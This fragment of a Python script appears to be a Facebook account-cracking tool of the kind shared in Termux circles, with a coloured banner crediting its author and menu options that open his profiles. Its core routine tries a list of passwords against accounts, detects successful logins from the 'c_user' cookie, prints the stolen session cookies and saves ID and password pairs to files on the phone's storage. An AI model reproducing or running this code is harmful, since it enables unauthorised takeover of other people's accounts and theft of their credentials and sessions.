...
\033[1;32m║══════════════════════════════════
\033[1;32m║AUTHOR    : ASHRAFUL-XD            
\033[1;32m║══════════════════════════════════
\033[1;32m║GITHUB    :   ASHRAFUL-XD
\033[1;32m║══════════════════════════════════
\033[1;32m║SERVER    : DATA - WIFI WORKING   
\033[1;32m║══════════════════════════════════
\033[1;32m║FACEBOOK LINK : \x1b[1;91mfacebook.com/WDX.XD\033[1;32m  
\033[1;32m╚══════════════════════════════════╝\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/WDX.XD')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW MY GITHUB ACCOUNT')
    print(' [2] EXIT')
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/mK.XD4')
        return None
    if opt == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100086252664602/')
        return None
...
def i():
    ...
    print('Ids saved in M4HIN-ok.txt, M4HIN-Cp.txt')
    print('\033[1;32m ══════════════════════════════════════════════════════════')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(ASHRAFUL-oK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/M4HIN-oK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ASHRAFUL-Cp)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/M4HIN-Cp.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[ASHR4FUL] [%s/%s]  oK:- %s  Cp:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
